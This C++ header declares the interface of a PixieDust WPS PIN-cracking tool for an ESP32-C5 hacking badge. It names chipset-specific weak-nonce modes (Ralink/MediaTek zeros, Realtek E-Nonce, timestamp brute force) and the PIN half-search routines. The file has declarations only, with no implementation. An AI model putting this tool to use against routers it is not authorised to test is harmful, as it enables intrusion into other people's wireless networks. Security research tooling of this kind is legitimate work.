// WpsPixieDust.h – Native C++ PixieDust attack for ESP32-C5 Pwnterrey Badge
// Ports pixiewps logic using WpsCrypto SDK primitives
// Modes: ZEROS (Ralink), ENONCE (nonce-based), TIMESTAMP (+/-10s)
#pragma once
#ifndef WpsPixieDust_h
#define WpsPixieDust_h

#include <Arduino.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include "WpsCrypto.h"

// ── PixieDust seed modes ─────────────────────────────────────────────────────
#define PIXIE_MODE_ZEROS     0   // E-S1=E-S2=zeros  (Ralink/MediaTek)
#define PIXIE_MODE_ENONCE    1   // E-S1=E-Nonce repeated (some Realtek)
#define PIXIE_MODE_TIMESTAMP 2   // Timestamp ±10 s bruteforce

// ── Result ───────────────────────────────────────────────────────────────────
struct PixieDustResult {
    bool     found;
    char     pin[9];     // 8-digit WPS PIN + null
    uint8_t  mode;       // which mode succeeded
    int32_t  ts_offset;  // timestamp offset (mode TIMESTAMP only)
};

// ── WpsPixieDust ─────────────────────────────────────────────────────────────
class WpsPixieDust {
public:
    WpsPixieDust();

    // Run all modes in sequence.  Returns first hit, or {found=false}.
    // pke/pkr: 192 bytes each.  auth_key: 32 bytes.
    // e_nonce: 16 bytes.  e_hash1/e_hash2: 32 bytes each.
    // base_ts: Unix timestamp from E-Nonce (or 0 for no TIMESTAMP mode).
    PixieDustResult run(
        const uint8_t *pke,       // 192 B  Enrollee public key
        const uint8_t *pkr,       // 192 B  Registrar public key
        const uint8_t *auth_key,  // 32  B  AuthKey
        const uint8_t *e_nonce,   // 16  B  Enrollee nonce
        const uint8_t *e_hash1,   // 32  B
        const uint8_t *e_hash2,   // 32  B
        uint32_t base_ts = 0
    );

    // Run only one specified mode
    PixieDustResult runMode(
        uint8_t mode,
        const uint8_t *pke,
        const uint8_t *pkr,
        const uint8_t *auth_key,
        const uint8_t *e_nonce,
        const uint8_t *e_hash1,
        const uint8_t *e_hash2,
        uint32_t base_ts = 0
    );

private:
    // Try to crack first + second halves given E-S1 and E-S2 candidates.
    // Fills pin[8] on success, returns true.
    bool tryCrack(
        const uint8_t *e_s1,
        const uint8_t *e_s2,
        const uint8_t *pke,
        const uint8_t *pkr,
        const uint8_t *auth_key,
        const uint8_t *e_hash1,
        const uint8_t *e_hash2,
        char *pin_out            // 8 chars + null
    );

    // Find first half (0000-9999) using E-S1 candidate.
    // Returns found first_half in [0,9999] or -1.
    int findFirstHalf(
        const uint8_t *e_s1,
        const uint8_t *pke,
        const uint8_t *pkr,
        const uint8_t *auth_key,
        const uint8_t *e_hash1
    );

    // Find second half (000-999) using E-S2 candidate and known first half.
    // Returns found second_half in [0,999] or -1.
    int findSecondHalf(
        const uint8_t *e_s2,
        const uint8_t *pke,
        const uint8_t *pkr,
        const uint8_t *auth_key,
        const uint8_t *e_hash2,
        int first_half
    );

    // WPS checksum digit for a 7-digit value
    static uint8_t wpsChecksum(uint32_t pin7);

    // Compute HMAC-SHA256(key, data) using SDK primitive
    static bool hmac(
        const uint8_t *key, size_t key_len,
        const uint8_t *data, size_t data_len,
        uint8_t *out_32
    );

    // Compute HMAC-SHA256(key, a||b||c||d) over 4 buffers (vector variant)
    static bool hmacVector4(
        const uint8_t *key, size_t key_len,
        const uint8_t *a, size_t la,
        const uint8_t *b, size_t lb,
        const uint8_t *c, size_t lc,
        const uint8_t *d, size_t ld,
        uint8_t *out_32
    );

    // Encode uint32_t as 4-byte big-endian (for timestamp seed)
    static void uint32ToBe(uint32_t v, uint8_t *out);
};

#endif // WpsPixieDust_h
